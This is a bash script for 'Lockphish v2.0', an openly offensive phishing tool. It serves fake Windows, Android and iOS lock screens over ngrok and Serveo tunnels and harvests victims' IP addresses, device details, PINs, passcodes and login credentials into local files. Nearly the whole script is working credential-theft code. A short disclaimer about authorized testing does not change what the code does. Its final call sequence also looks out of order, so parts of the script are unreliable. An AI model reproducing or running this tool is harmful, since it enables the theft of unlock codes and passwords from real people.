#!/bin/bash
# Lockphish v2.0
# Coded by: github.com/kali-linux-tutorial/lockphish 
# Twitter: twitter.com/kalilinux_in
# https://www.kalilinux.in
# Read the License before using any part from this code.

trap 'printf "\n";stop' 2

banner() {


printf "\e[1;33m    __            _    \e[0m\e[1;77m      _     _     _      \e[0m\n"
printf "\e[1;33m   / /  ___   ___| | __\e[0m\e[1;77m_ __ | |__ (_)___| |__   \e[0m\n"
printf "\e[1;33m  / /  / _ \ / __| |/ /\e[0m\e[1;77m '_ \| '_ \| / __| '_ \  \e[0m\n"
printf "\e[1;33m / /__| (_) | (__|   <|\e[0m\e[1;77m |_) | | | | \__ \ | | | \e[0m\n"
printf "\e[1;33m \____/\___/ \___|_|\_\ \e[0m\e[1;77m.__/|_| |_|_|___/_| |_| By FTM\e[0m\n"
printf "\e[1;77m                      |_|                  \e[0m\e[1;33mv2.0\e[0m\n"

printf " \n\e[1;77m coded by: github.com/kali-linux-tutorial/lockphish\e[0m \n"
printf " \e[1;77mTwitter: twitter.com/kalilinux_in\e[1;77m\e[0m"
printf "\n\n\n\e[1;91m Disclaimer: this tool is designed for security\n"
printf " testing in an authorized simulated cyberattack\n"
printf " Attacking targets without prior mutual consent\n"
printf " is illegal! by FTM\n"

printf "\n"



}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v ngrok > /dev/null 2>&1 || { echo >&2 "I require ngrok but it's not installed. Install it. Aborting."; exit 1; }


}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
device=$(grep -o ';.*;*)' ip.txt | cut -d ')' -f1 | tr -d ";")
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Device:\e[0m\e[1;77m %s\e[0m\n" $device
cat ip.txt >> saved.ip.txt


}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "pin.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Android PIN received!\e[0m\n"
pin=$(tail -n1 pin.txt)
printf "\e[1;92m[\e[0m+\e[1;92m] PIN:\e[0m\e[1;77m %s\e[0m\n" $pin
printf "\e[1;92m[\e[0m+\e[1;92m] Saved:\e[0m\e[1;77m pin.saved.txt\e[0m\n"
cat pin.txt >> pin.saved.txt
rm -rf pin.txt
fi

if [[ -e "passwords.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Win credentials received!\e[0m\n"
username=$(tail -n1 usernames.txt)
password=$(tail -n1 passwords.txt)
printf "\e[1;92m[\e[0m+\e[1;92m] Username:\e[0m\e[1;77m %s\e[0m\n" $username
printf "\e[1;92m[\e[0m+\e[1;92m] Password:\e[0m\e[1;77m %s\e[0m\n" $password
printf "\e[1;92m[\e[0m+\e[1;92m] Saved:\e[0m\e[1;77m win.saved.txt\e[0m\n"
cat usernames.txt >> win.saved.txt
cat passwords.txt >> win.saved.txt
rm -rf usernames.txt
rm -rf passwords.txt
fi

if [[ -e "passcode.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] IOS passcode received!\e[0m\n"
passcode=$(tail -n1 passcode.txt)
printf "\e[1;92m[\e[0m+\e[1;92m] Passcode:\e[0m\e[1;77m  %s\e[0m\n" $passcode
printf "\e[1;92m[\e[0m+\e[1;
92m] Saved:\e[0m\e[1;77m  passcode.txt\e[0m\n"
cat passcode.txt >> passcode.saved.txt
rm -rf passcode.txt
fi

sleep 0.5

done 

}

### SERVEO DISABLED
server() {

command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }

printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

if [[ $subdomain_resp == true ]]; then

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &

sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &

sleep 8
fi
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 3
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link

}


payload_ngrok() {
url=$redirect #"https://www.youtube.com"
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
payload_name="index"
printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Building webpages\e[0m\n"
sed 's+forwarding_url+'$url'+g' post.php > cat.php
sed 's+forwarding_link+'$link'+g' win.html | sed 's+forwarding_url+'$url'+g' > win2.html
sed 's+forwarding_link+'$link'+g' phone.html | sed 's+forwarding_url+'$url'+g' > iphone2.html
sed 's+forwarding_link+'$link'+g' droid.html | sed 's+forwarding_url+'$url'+g' > droid2.html

IFS=$'\n'
data_base64=$(base64 -w 0 win2.html)
temp64="$( echo "${data_base64}" | sed 's/[\\&*./+!]/\\&/g' )"

#printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Converting webpage to base64\e[0m\n" 
#printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Injecting Data URI code (base64) into index2.html\e[0m\n"
sed 's+forwarding_link+'$link'+g' template.html | sed 's+payload_name+'$payload_name'+g' | sed 's+data_base64+'${temp64}'+g ' > index2.html

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m+\e[1;93m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
}

ngrok_server() {

if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
arch3=$(uname -a | grep -o 'amd64' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

elif [[ $arch3 == *'amd64'* ]] ; then

wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-amd64.zip ]]; then
unzip ngrok-stable-linux-amd64.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-amd64.zip
else
printf "\e[1;93m[!] Download error...\e[0m\n"
exit 1
fi

fi

fi
}
################
# CTRL+C
trap ctrl_c INT
ctrl_c() {
clear
printf "\e[0m\e[1;77m[\e[0m\e[1;91m!\e[0m\e[1;77m] (Ctrl + C ) Detected, Trying To Exit...\n"
printf "\e[0m\e[1;77m[\e[0m\e[1;91m!\e[0m\e[1;77m] Stopping servers...\n"
printf "\e[0m\e[1;77m[\e[0m\e[1;91m!\e[0m\e[1;77m] Thanks For Using Lockphish :)\n"
sleep 1
exit
}
catch_ip
dependencies
server
ngrok_server
payload_ngrok
checkfound
banner
payload_ngrok
trap ctrl_c INT
sleep 1
printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Automatically copying link to clipboard...\e[0m\n"
echo -n "$link" | xclip -selection clipboard
printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Copied to clipboard!\n"
printf "\e[1;77m[\e[0m\e[1;91m!\e[0m\e[1;77m] Exit by pressing Ctrl + C\n"
while [ true ]; do

checkfound

sleep 0.2

done


